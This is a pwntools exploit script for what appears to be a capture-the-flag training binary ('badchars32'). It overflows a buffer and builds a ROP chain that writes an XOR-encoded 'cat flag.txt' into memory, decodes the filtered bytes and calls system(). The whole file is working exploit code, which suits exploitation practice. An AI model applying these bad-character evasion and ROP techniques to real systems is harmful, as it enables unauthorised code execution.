from pwn import *;


def xor_string_at_address(pop_gadget, xor_gadget, key, address, index):
	returndata = ""
	returndata += p32(pop_gadget) # pop ebx; pop ecx; ret;
	returndata += p32(address + index) # ebx
	returndata += p32(key) # ecx
	returndata += p32(xor_gadget) # xor byte ptr [ebx], cl; ret;
	return returndata



def write_string_to_address(pop_gadget, mov_gadget, address, string):
	returndata = ""
	stringsplit = [string[i:i+4] for i in range(0,len(string),4)]
	for i in range(len(stringsplit)):
		returndata += p32(pop_gadget) # pop esi; pop edi; ret;
		returndata += stringsplit[i] # esi 
		returndata += p32(address + (i*4)) # edi 
		returndata += p32(mov_gadget) # mov dword ptr [edi], esi; ret;
	return returndata

def xor_string(string):
	returndata = ""
	inputbytes = bytearray(string)
	xorindex = []
	badchars = [0x62,0x69,0X63,0x2f,0x20,0x66,0x6e,0x73]
	for i in range(len(inputbytes)):
		if inputbytes[i] in list(badchars):
			returndata += chr(inputbytes[i] ^ key)
			xorindex.append(i)
		else:
			returndata += chr(inputbytes[i])
	return returndata,xorindex

def pad_string(string):
	string += "\x00"
	while len(string) % 4 != 0:
		string += "\x00"
	return string

# 80484e0 <system@plt>

e = ELF("badchars32")
p = process(e.path)
# p = gdb.debug(e.path, "b *0x80487a8\ncontinue\n")

# bof @ 44
junk = 'A' * 44
command = "cat flag.txt"
key = 0xa9

command_pad = pad_string(command)
command_xor,xorindex = xor_string(command_pad)

sym_data = 0x0804a038 # l    d  .data	00000000              .data
plt_system = 0x80484e0

xor_ebx_cl  = 0x08048890 # xor byte ptr [ebx], cl; ret;
mov_edi_esi = 0x08048893 # mov dword ptr [edi], esi; ret;
pop_ebx_ecx = 0x08048896 # pop ebx; pop ecx; ret;
pop_esi_edi = 0x08048899 # pop esi; pop edi; ret;

chain = junk
chain += write_string_to_address(pop_esi_edi, mov_edi_esi, sym_data, command_xor)
for i in xorindex:
	chain += xor_string_at_address(pop_ebx_ecx, xor_ebx_cl, key, sym_data, i)
chain += p32(plt_system)
chain += "junk"
chain += p32(sym_data)

p.sendline(chain)
print(p.readall())
